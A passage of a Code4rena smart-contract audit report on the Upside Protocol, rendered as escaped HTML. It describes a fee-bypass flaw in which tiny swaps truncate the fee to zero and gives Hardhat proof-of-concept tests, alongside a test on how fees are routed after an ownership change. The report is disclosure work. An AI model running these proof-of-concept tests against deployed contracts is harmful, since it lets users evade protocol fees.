class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  it(\u0026quot;should send fees to original owner\u0026quot;, async function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const url1 = \u0026quot;https://openzeppelin.com\u0026quot;;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const url2 = \u0026quot;https://cantina.com\u0026quot;;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const liquidityTokenAddress = await liquidityToken.getAddress();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const tokenizeFeeDestinationAddress = await owner.getAddress();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const _mintAmount = hhethers.parseUnits(\u0026quot;100\u0026quot;, 6);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const _feeAmount = hhethers.parseUnits(\u0026quot;5\u0026quot;, 6);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Configure fee parameters with current owner as the fee destination\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const newFeeInfo = {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      tokenizeFeeEnabled: true,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      tokenizeFeeDestinationAddress: tokenizeFeeDestinationAddress,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeStartingBp: 9900,  // 99%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeDecayBp: 100,      // 1%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeDecayInterval: 6,  // 6 seconds\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeFinalBp: 100,      // 1%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeDeployerBp: 1000,  // 10%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeSellBp: 100,       // 1%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Owner sets the fee configuration\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await upsideProtocol.connect(owner).setFeeInfo(newFeeInfo);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // set tokenize fee to 5e6\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await upsideProtocol.connect(owner).setTokenizeFee(liquidityTokenAddress, _feeAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // mint liquidityToken to user1\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await liquidityToken.mint(await user1.getAddress(), _mintAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // assert that user1 received the minted tokens\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let user1LiquidityTokenBalance = await liquidityToken.balanceOf(await user1.getAddress());\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(user1LiquidityTokenBalance).to.be.eq(_mintAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // user1 performs tokenization (url1), fee should go to current fee destination (owner)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await liquidityToken.connect(user1).approve(await upsideProtocol.getAddress(), _feeAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await upsideProtocol.connect(user1).tokenize(url1, liquidityTokenAddress);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Validate that the fee was received by the original owner\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let tokenizeFeeDestinationAddressBalance = await liquidityToken.balanceOf(tokenizeFeeDestinationAddress);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(tokenizeFeeDestinationAddressBalance).to.be.eq(hhethers.parseUnits(\u0026quot;5\u0026quot;, 6));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Transfer ownership to user2\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await upsideProtocol.connect(owner).transferOwnership(await user2.getAddress());\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // asset that new ownership is assigned to user2\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(await upsideProtocol.owner()).to.be.eq(await user2.getAddress());\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // user1 performs a second tokenization (url2) after ownership transfer\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await liquidityToken.connect(user1).approve(await upsideProtocol.getAddress(), _feeAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await upsideProtocol.connect(user1).tokenize(url2, liquidityTokenAddress);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // assert that the original owner still receives the fee post-ownership transfer\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let currentTokenizeFeeDestinationAddressBalance = await liquidityToken.balanceOf(await owner.getAddress());\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(currentTokenizeFeeDestinationAddressBalance).to.be.eq(hhethers.parseUnits(\u0026quot;10\u0026quot;, 6));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  });\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch2 id=\"03-swap-fee-bypass-via-small-trade-amounts\" style=\"position:relative;\"\u003e\u003ca href=\"#03-swap-fee-bypass-via-small-trade-amounts\" aria-label=\"03 swap fee bypass via small trade amounts permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[03] Swap fee bypass via small trade amounts\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L198-L229\"\u003ehttps://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L198-L229\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-1\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-1\" aria-label=\"finding description 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003eswap()\u003c/code\u003e function in the \u003ccode\u003eUpsideProtocol\u003c/code\u003e smart contract is vulnerable to fee circumvention when users initiate swaps with extremely small input amounts. The issue stems from the use of integer division in Solidity, which truncates values. As a result, when the calculated fee amount is less than 1 (due to the small trade size), it truncates to zero, effectively bypassing the protocolâ€™s fee logic.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"7\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e       \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_isBuy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// @dev On buy, the dynamic time fee is used\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeBp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAmountAfterFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis behavior directly undermines the intended fee model, allowing users to perform token swaps without contributing any fee to the protocol. The bypass is particularly problematic given the economic incentives it createsâ€”users could automate micro-swaps to avoid fees entirely while still draining value from the system.\u003c/p\u003e\n\u003ch3 id=\"impact-1\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eNo fees are collected on small trade size.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eSet a protocol-wide minimum input amount to reject trades too small to generate fees:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"8\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   require(_amount \u0026gt;= MIN_SWAP_AMOUNT, \u0026quot;Swap amount too small\u0026quot;);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"proof-of-concept-2\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of concept\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eIn \u003ccode\u003ePoC.test.ts\u003c/code\u003e, make the following modification:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"9\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    import { HardhatEthersSigner } from \u0026quot;@nomicfoundation/hardhat-ethers/signers\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    import { ethers as hhethers } from \u0026quot;hardhat\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    import {IERC20Metadata, UpsideMetaCoin, UpsideProtocol, UpsideStakingStub} from \u0026quot;../types\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    // Add this import\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   import { expect } from \u0026quot;chai\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003eAdd the following test in \u003ccode\u003ePoC.test.ts\u003c/code\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"10\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  it(\u0026quot;should implement fee exemption for user1 during swap\u0026quot;, async function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const tokenizeFeeDestinationAddress = await owner.getAddress();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const _mintAmount = hhethers.parseUnits(\u0026quot;100\u0026quot;, 6);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Set up a initial swap fee configuration\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const newFeeInfo = {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      tokenizeFeeEnabled: true,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      tokenizeFeeDestinationAddress: tokenizeFeeDestinationAddress,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeStartingBp: 100,  // 10%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeDecayBp: 100,      // 1%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeDecayInterval: 6,  // 6 seconds\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeFinalBp: 90,      // 0.9%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeDeployerBp: 1000,  // 10%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeSellBp: 100,       // 1%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Set fee info:\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await upsideProtocol.connect(owner).setFeeInfo(newFeeInfo);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // mint user1 with liquidityToken\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await liquidityToken.mint(await user1.getAddress(), _mintAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Verify user1 received the correct liquidity token balance\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let user1LiquidityTokenBalance = await liquidityToken.balanceOf(await user1.getAddress());\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(user1LiquidityTokenBalance).to.be.eq(_mintAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Perform a swap with an extremely small input amount\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const _tokenAmount = hhethers.parseUnits(\u0026quot;0.000099\u0026quot;, 6);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await liquidityToken.connect(user1).approve(await upsideProtocol.getAddress(), _tokenAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await upsideProtocol.connect(user1).swap(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await sampleLinkToken.getAddress(),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      true,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      _tokenAmount,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      0,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await user1.getAddress()\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // assert that user1 receives a non-zero amount of LINK tokens\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let user1LinkTokenBalance = await sampleLinkToken.balanceOf(await user1.getAddress());\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(user1LinkTokenBalance).to.be.gt(0);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Check that no protocol fees were collected from the swap\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let claimableProtocolFees = await upsideProtocol.claimableProtocolFees();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(claimableProtocolFees).to.be.eq(0); // Fee bypass confirmed\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  });\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cem\u003eNote: QA report issues deemed invalid by the judge have been removed for reporting purposes.\u003c/em\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch1 id=\"disclosures\" style=\"position:relative;\"\u003e\u003ca href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eDisclosures\u003c/h1\u003e\n\u003cp\u003eC4 is an open organization governed by participants in the community.\u003c/p\u003e\n\u003cp\u003eC4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.\u003c/p\u003e\n\u003cp\u003eC4 does not provide any guarantee or warranty regarding the security of this project. All smart contract 